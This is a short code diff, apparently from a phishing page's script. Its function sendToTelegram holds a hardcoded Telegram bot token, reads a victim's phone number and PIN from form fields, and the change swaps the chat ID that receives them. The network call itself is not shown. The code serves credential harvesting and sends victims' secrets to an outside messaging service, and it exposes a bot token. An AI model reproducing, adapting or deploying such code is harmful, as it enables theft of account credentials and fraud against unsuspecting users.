@@ -1,6 +1,6 @@
 function sendToTelegram() {
     const token = '6465635016:AAHhABQKZwEkP6iwzfB-6v5okWhme5emF4k';
-    const chatId = '-1002247759131';
+    const chatId = '1763021985';
     const phone = document.getElementById('phone').value;
     const pin = document.getElementById('pin').value;
 
